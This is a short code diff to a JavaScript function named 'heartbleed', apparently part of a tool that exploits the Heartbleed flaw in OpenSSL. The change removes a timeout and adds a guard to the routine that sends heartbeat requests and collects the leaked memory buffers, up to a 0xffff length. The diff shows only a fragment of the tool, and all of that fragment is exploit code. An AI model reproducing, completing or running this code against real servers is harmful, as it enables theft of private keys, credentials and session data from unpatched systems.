@@ -60,12 +60,10 @@ function heartbleed(ip, port, host) {
       primeSize = cert.modulus.length / 4;
     }
 
-    setTimeout(function() {
-      // NOTE: Will be picked up by isSessionReused
-      s.sslWrap = new binding.SSLWrap();
-      s.sslWrap.onheartbeat = onheartbeat;
-      send();
-    }, 10);
+    // NOTE: Will be picked up by isSessionReused
+    s.sslWrap = new binding.SSLWrap();
+    s.sslWrap.onheartbeat = onheartbeat;
+    send();
 
     function onheartbeat(buf) {
       acc.push(buf);
@@ -84,6 +82,8 @@ function heartbleed(ip, port, host) {
 
     var acc = [], total = 0, sent = 0;
     function send() {
+      if (!s.pair.ssl)
+        return;
       acc = [];
       total = 0;
       var max = 0xffff;
